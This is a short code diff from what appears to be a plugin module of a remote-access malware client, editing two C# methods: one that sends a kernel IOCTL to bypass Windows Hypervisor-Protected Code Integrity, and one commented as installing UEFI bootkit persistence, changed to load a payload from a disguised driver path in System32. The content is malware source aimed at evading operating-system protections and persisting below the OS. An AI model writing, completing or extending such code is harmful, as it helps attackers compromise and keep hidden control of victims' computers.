@@ -402,17 +402,17 @@ namespace Pulsar.Plugins.Client.Modules
         public bool BypassHVCI()
         {
             if (!_connected) return false;
-            var target = new KernelController.BoolStruct { Enable = true };
+            var target = new KernelController.TargetProcess { Pid = IntPtr.Zero, Enable = true };
             return _kernel.SendIoctl(KernelController.HVCI_BYPASS, ref target);
         }
 
         /// <summary>
         /// Install UEFI persistence (bootkit)
         /// </summary>
-        public bool InstallUefiPersistence()
+        public bool InstallUefiPersistence(string payloadPath = "C:\\Windows\\System32\\shadow.sys")
         {
             if (!_connected) return false;
-            var target = new KernelController.BoolStruct { Enable = true };
+            var target = new KernelController.TargetInjection { Pid = IntPtr.Zero, Path = payloadPath };
             return _kernel.SendIoctl(KernelController.UEFI_PERSIST, ref target);
         }
 
